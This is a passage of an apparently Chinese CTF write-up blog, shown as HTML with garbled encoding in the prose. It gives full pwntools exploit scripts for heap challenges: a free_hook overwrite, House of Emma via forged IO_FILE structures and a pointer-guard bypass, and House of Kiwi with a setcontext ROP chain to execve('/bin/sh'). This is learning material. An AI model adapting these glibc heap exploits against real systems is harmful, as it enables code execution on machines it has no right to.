class="built_in">next</span>=((heap_addr1&gt;&gt;<span class="number">12</span>)&amp;<span class="number">0xffffffffffffffff</span>)^free_hook</span><br><span class="line">    edit(<span class="number">1</span>,p64(<span class="built_in">next</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    new(<span class="number">0x40</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    system_addr=libc.sym[<span class="string">&quot;system&quot;</span>]+libc_addr</span><br><span class="line">    new(<span class="number">0x40</span>,p64(system_addr))</span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line">    <span class="comment"># gdb.attach(sh)</span></span><br><span class="line">    sh.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<h2 id="pwn5"><a href="#pwn5" class="headerlink" title="pwn5"></a>pwn5</h2><p>é¢˜ç›®ç›´æ¥è¯´äº†æ˜¯emma,é‚£å°±æ‹¿emmaæ‰“å§ï¼Œemmaä¸€å…±æœ‰ä¸¤ç§æ‰“æ³•ï¼Œä¸€ç§æ˜¯fsopï¼Œåˆ·æ–°ioé“¾ï¼Œæ‰€ä»¥å¯ä»¥ä¼ªé€ ä¸¤ä¸ªæœ‰emmaè°ƒç”¨é“¾çš„ioç»“æ„ï¼Œä¸€ä¸ªç»“æ„æ”¹key,ç„¶åè®©ä¸‹ä¸€ä¸ªioç»“æ„æ‹¿shell,å¦ä¸€ç§æ˜¯æ§åˆ¶stderrç»“æ„ä½“ï¼Œæ„é€ emmaçš„è°ƒç”¨é“¾ï¼Œç„¶åä¿®æ”¹topchunkçš„sizeç”³è¯·å †å—æŠ¥é”™è¿›å…¥è¿™ä¸ªå‡½æ•°ï¼Œåœ¨è¿™ä¸ªå‡½æ•°çš„__fxprintfä¸­å°±ä¼šè§¦å‘emmaçš„è°ƒç”¨é“¾äº†</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__malloc_assert (<span class="keyword">const</span> <span class="keyword">char</span> *assertion, <span class="keyword">const</span> <span class="keyword">char</span> *file, <span class="keyword">unsigned</span> <span class="keyword">int</span> line,</span><br><span class="line">       <span class="keyword">const</span> <span class="keyword">char</span> *function)</span><br><span class="line">&#123;</span><br><span class="line">(<span class="keyword">void</span>) __fxprintf (<span class="literal">NULL</span>, <span class="string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span>,</span><br><span class="line">           __progname, __progname[<span class="number">0</span>] ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">           file, line,</span><br><span class="line">           function ? function : <span class="string">&quot;&quot;</span>, function ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">           assertion);</span><br><span class="line">fflush (<span class="built_in">stderr</span>);</span><br><span class="line"><span class="built_in">abort</span> ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é“é¢˜ä½¿ç”¨çš„æ˜¯åä¸€ç§æ–¹æ³•ï¼Œæµç¨‹å¦‚ä¸‹,ä¸è¿‡è¿™é“é¢˜å€’æ˜¯ä¸ç”¨setcontext,ç›´æ¥systemæ‹¿shell</p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220527133817903.png" alt="image-20220527133817903"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#sh=process(&quot;./pwn&quot;)</span></span><br><span class="line">sh=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">28733</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx,size,content</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;&gt;&gt;\n&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Index: \n&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Size: \n&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Content\n&quot;</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,content</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;&gt;&gt;\n&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Index: \n&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Content\n&quot;</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;&gt;&gt;\n&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Index: \n&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;&gt;&gt;\n&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Index: \n&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ROL</span>(<span class="params">content, key</span>):</span></span><br><span class="line">    tmp = <span class="built_in">bin</span>(content)[<span class="number">2</span>:].rjust(<span class="number">64</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(tmp[key:] + tmp[:key], <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    add(-<span class="number">4</span>,<span class="number">0x420</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x460</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">4</span>,<span class="number">0x450</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">1</span>,<span class="number">0x450</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">2</span>,<span class="number">0x600</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    edit(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    libc_addr=u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x61</span>-<span class="number">0x1e1000</span></span><br><span class="line">    edit(<span class="number">0</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">3</span>,<span class="number">0x600</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    heap_addr=u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0xf90</span></span><br><span class="line">    add(<span class="number">1</span>,<span class="number">0x450</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    edit(<span class="number">0</span>,p64(libc_addr+<span class="number">0x1e1000</span>)*<span class="number">2</span>+p64(<span class="number">0</span>)+p64(libc_addr+<span class="number">0x1ed5b0</span>-<span class="number">0x20</span>))</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">5</span>,<span class="number">0x600</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">6</span>,<span class="number">0xa00</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    free(<span class="number">6</span>)</span><br><span class="line">    add(<span class="number">7</span>,<span class="number">0x500</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    edit(<span class="number">6</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x500</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xce</span>))</span><br><span class="line">    fake_IO_FILE=p64(<span class="number">0x00000000fbad2087</span>)</span><br><span class="line">    system_addr=libc_addr+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">    fake_IO_FILE+=p64(heap_addr+<span class="number">0x2100</span>)*<span class="number">8</span></span><br><span class="line">    fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x68</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    fake_IO_FILE += p64(<span class="number">0</span>)  <span class="comment"># _chain</span></span><br><span class="line">    fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x88</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    fake_IO_FILE += p64(heap_addr)  <span class="comment"># _lock = writable address</span></span><br><span class="line">    fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xB0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    fake_IO_FILE += p64(<span class="number">0</span>)  <span class="comment"># _mode = 0</span></span><br><span class="line">    fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xd8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    fake_IO_FILE += p64(<span class="number">0x1e1a20</span>+libc_addr + <span class="number">0x40</span>)  <span class="comment"># vtable</span></span><br><span class="line">    fake_IO_FILE += p64(heap_addr+<span class="number">0xb30</span>+<span class="number">0x10</span>)  <span class="comment"># rdi</span></span><br><span class="line">    fake_IO_FILE += p64(<span class="number">0</span>)</span><br><span class="line">    <span class="comment"># pay=system_addr^(heap_addr+0xf90)</span></span><br><span class="line">    <span class="comment"># pay1=pay&amp;0x7ff</span></span><br><span class="line">    <span class="comment"># pay2=pay&amp;</span></span><br><span class="line">    fake_IO_FILE += p64(ROL(system_addr ^ (heap_addr + <span class="number">0xf90</span>), <span class="number">0x11</span>))</span><br><span class="line">    fake_IO_FILE+=p64(<span class="number">0</span>)</span><br><span class="line">    edit(<span class="number">4</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">    edit(-<span class="number">4</span>,fake_IO_FILE)</span><br><span class="line">    <span class="comment">#fake_IO_FILE += p64(ROL(gadget_addr ^ (heap_base + 0x22a0), 0x11))</span></span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(system_addr ^ (heap_addr + <span class="number">0xf90</span>))</span><br><span class="line">    <span class="comment">#gdb.attach(sh)</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;&gt;&gt;\n&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Index: \n&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(<span class="number">8</span>))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Size: \n&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(<span class="number">0x600</span>))</span><br><span class="line">    sh.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<p>pwn6</p>
<p>house of kiwi,ç½‘ä¸Šè®²çš„éå¸¸æ¸…æ¥šï¼Œå°±ä¸è¯´æ”»å‡»æµç¨‹äº†ï¼Œè¿™é“é¢˜æœ€ä¸»è¦çš„é—®é¢˜æ˜¯é™åˆ¶å…±äº«åº“çš„ä½ç½®ï¼Œç„¶åæ²¡æœ‰ç¬¦å·è¡¨è°ƒè¯•çš„æ—¶å€™å¾ˆéš¾å—ï¼Œmarkç»™äº†ç¬¦å·è¡¨å’Œè°ƒè¯•è„šæœ¬æ‰èƒ½è¿›è¡ŒåŠ¨è°ƒ.è„šæœ¬å¦‚ä¸‹</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh=process([<span class="string">&#x27;./ld-2.31.so&#x27;</span>, <span class="string">&#x27;./pwn&#x27;</span>], env=&#123;<span class="string">&quot;LD_LIBRARY_PATH&quot;</span>:<span class="string">&#x27;./libc-so.6&#x27;</span>&#125;)</span><br><span class="line"><span class="comment">#sh=remote(&quot;node4.buuoj.cn&quot;,26914)</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">libc=ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    load1=<span class="string">&quot;source ./loadsym.py\n&quot;</span></span><br><span class="line">    load2=<span class="string">&quot;loadsym &#x27;/home/ctf/getshell/des/pwn4/1/usr/lib/debug/lib/x86_64-linux-gnu/libc-2.31.so&#x27;\n&quot;</span></span><br><span class="line">    gdb.attach(sh,load1+load2)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init</span>(<span class="params">content</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Before the game starts, please give me your name:&quot;</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,idx,content</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;[4] edit note.\n&gt;&gt; &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;How much do you want?\n&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Which one do you want to put?\n&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Tell me your idea:\n&quot;</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;[4] edit note.\n&gt;&gt; &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Which one do you want to remove?\n&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;[4] edit note.\n&gt;&gt; &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Which one do you want to look?\n&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,content</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;[4] edit note.\n&gt;&gt; &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Which one do you want to change?\n&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Change your idea:\n&quot;</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    init(<span class="string">&#x27;zhangpeng&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x48</span>,<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x48</span>)</span><br><span class="line">    add(<span class="number">0x50</span>,<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x50</span>,<span class="number">2</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>,<span class="number">10</span>):</span><br><span class="line">        add(<span class="number">0xb0</span>,i,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>,<span class="number">10</span>):</span><br><span class="line">        free(i)</span><br><span class="line">    edit(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x48</span>+p8(<span class="number">0xc1</span>))</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">0x50</span>,<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    show(<span class="number">2</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;content: &quot;</span>)</span><br><span class="line">    libc_addr=u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x1ebbe0</span></span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(libc_addr)</span><br><span class="line">    _IO_file_jumps_addr=libc.sym[<span class="string">&quot;_IO_file_jumps&quot;</span>]+libc_addr</span><br><span class="line">    <span class="comment">#IO_helper_jumps_addr=libc.sym[&quot;_IO_helper_jumps&quot;]+libc_addr</span></span><br><span class="line">    _IO_helper_jumps_addr=libc_addr+<span class="number">0x1ec960</span>-<span class="number">0xc0</span></span><br><span class="line">    add(<span class="number">0x20</span>,<span class="number">3</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x20</span>,<span class="number">4</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    free(<span class="number">4</span>)</span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line">    setcontent_addr=libc_addr+libc.sym[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">61</span></span><br><span class="line">    edit(<span class="number">2</span>,p64(_IO_file_jumps_addr+<span class="number">0x60</span>)+p64(<span class="number">0</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x20</span>,<span class="number">3</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x20</span>,<span class="number">4</span>,p64(setcontent_addr))</span><br><span class="line">    add(<span class="number">0x20</span>,<span class="number">5</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    free(<span class="number">5</span>)</span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    show(<span class="number">2</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;content: &quot;</span>)</span><br><span class="line">    heap_addr=u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x920</span></span><br><span class="line">    edit(<span class="number">2</span>,p64(_IO_helper_jumps_addr+<span class="number">0xa0</span>)+p64(<span class="number">0</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x20</span>,<span class="number">3</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x20</span>,<span class="number">5</span>,p64(heap_addr+<span class="number">0xa00</span>))</span><br><span class="line">    ret_addr=libc_addr+<span class="number">0x0000000000025679</span></span><br><span class="line">    add(<span class="number">0x20</span>,<span class="number">6</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    free(<span class="number">6</span>)</span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line">    edit(<span class="number">2</span>,p64(_IO_helper_jumps_addr+<span class="number">0Xa8</span>)+p64(<span class="number">0</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x20</span>,<span class="number">3</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x20</span>,<span class="number">6</span>,p64(ret_addr))</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line">    add(<span class="number">0x78</span>,<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x78</span>)</span><br><span class="line">    add(<span class="number">0x70</span>,<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x30</span>,<span class="number">3</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    edit(<span class="number">0</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x78</span>+p8(<span class="number">0xc1</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    pop_rax=libc_addr+<span class="number">0x000000000004a550</span></span><br><span class="line">    pop_rdi=libc_addr+<span class="number">0x0000000000026b72</span></span><br><span class="line">    pop_rsi=libc_addr+<span class="number">0x0000000000027529</span></span><br><span class="line">    pop_rdx_r12=libc_addr+<span class="number">0x000000000011c371</span></span><br><span class="line">    syscall_addr=libc_addr+<span class="number">0x000000000002584d</span></span><br><span class="line">    rop=p64(pop_rax)+p64(<span class="number">59</span>)</span><br><span class="line">    rop+=p64(pop_rdi)+p64(heap_addr+<span class="number">0xa60</span>)</span><br><span class="line">    rop+=p64(pop_rsi)+p64(<span class="number">0</span>)</span><br><span class="line">    rop+=p64(pop_rdx_r12)+p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    rop+=p64(syscall_addr)</span><br><span class="line">    rop=rop.ljust(<span class="number">0x60</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    rop+=<span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    add(<span class="number">0x80</span>,<span class="number">1</span>,rop)</span><br><span class="line">    edit(<span class="number">3</span>,p64(<span class="number">0</span>)+p64(<span class="number">0xce</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    debug()</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;[4] edit note.\n&gt;&gt; &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;How much do you want?\n&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(<span class="number">0xe0</span>))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Which one do you want to put?\n&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(<span class="number">7</span>))</span><br><span class="line">    sh.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

